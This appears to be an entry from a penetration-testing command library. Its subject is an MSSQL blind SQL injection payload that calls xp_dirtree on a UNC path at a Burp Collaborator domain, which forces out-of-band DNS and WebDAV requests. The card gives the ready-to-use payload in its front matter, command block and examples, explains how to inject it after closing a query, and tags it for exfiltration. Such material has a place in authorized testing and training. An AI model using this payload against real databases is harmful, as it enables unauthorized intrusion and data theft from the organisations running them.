---
id: cmd-uuid-001
data: >-
  declare @q varchar(99);set
  @q='\\4fkxoc5km935m5n0dqqu3vvk5bb1zq.burpcollaborator.net/random'; exec
  master.dbo.xp_dirtree @q;--
tags:
  - sql-injection
  - exfiltration
type: command
output: null
executor: sql
platforms:
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:14.856Z'
verified: false
validated: true
submitted: true
---
# declare-xp_dirtree-unc

## Command

```sql
declare @q varchar(99);set @q='\\4fkxoc5km935m5n0dqqu3vvk5bb1zq.burpcollaborator.net/random'; exec master.dbo.xp_dirtree @q;--
```

## Description

This MSSQL command declares a variable @q, sets it to a UNC path with a collaborator domain, and executes xp_dirtree to enumerate the path, triggering DNS resolution and potential WebDAV requests for blind SQLi confirmation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| @q | VARCHAR variable holding the UNC path | Yes |
| \\domain/path | Collaborator UNC path for exfiltration | Yes |
| -- | Comment to close query | Yes |

## Examples

### Basic Usage

```sql
declare @q varchar(99);set @q='\\example.burpcollaborator.net/test'; exec master.dbo.xp_dirtree @q;--
```

### Advanced Usage

Inject after closing original query: '1; [above payload]'

## Expected Output

No direct output in blind SQLi; instead, external DNS query to domain and PROPFIND HTTP request from server.

## Related

- [[Related Procedure: Inject-xp_dirtree-Payload-for-Exfiltration]]
